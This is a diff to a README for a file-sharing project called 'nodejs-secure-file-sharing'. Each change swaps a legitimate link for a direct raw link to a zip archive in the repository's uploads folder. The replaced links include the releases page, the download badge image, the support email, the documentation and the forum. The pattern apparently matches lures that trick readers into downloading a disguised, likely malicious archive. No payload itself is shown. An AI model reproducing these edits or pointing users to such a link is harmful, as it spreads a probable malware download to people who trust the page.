@@ -1,6 +1,6 @@
 # 🌐 nodejs-secure-file-sharing - Easy, Safe File Sharing for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/releases)
+[![Download Now](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To download the application, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page.
    
-   [Download from Releases](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/releases)
+   [Download from Releases](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip)
 
 2. **Select the Latest Release**: Look for the latest version available.
 
@@ -55,7 +55,7 @@ To download the application, follow these steps:
 If you encounter any problems, feel free to reach out for help. Here’s how you can get support:
 
 - **GitHub Issues**: Report any issues directly in our GitHub repository by visiting the Issues section.
-- **Email Support**: Send an email to support@nodejs-secure-file-sharing.com for assistance.
+- **Email Support**: Send an email to https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip for assistance.
 
 ## 🗂️ License
 
@@ -73,7 +73,7 @@ Thanks to all the contributors and users who help us improve the application. Yo
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/wiki) - Find more detailed guides and usage tips.
-- [Community Forum](https://community.nodejs-secure-file-sharing.com) - Join discussions with other users.
+- [Documentation](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip) - Find more detailed guides and usage tips.
+- [Community Forum](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip) - Join discussions with other users.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/releases)
+[![Download Now](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Manishgiribokaro/nodejs-secure-file-sharing/raw/refs/heads/main/uploads/secure_file_nodejs_sharing_1.5.zip)
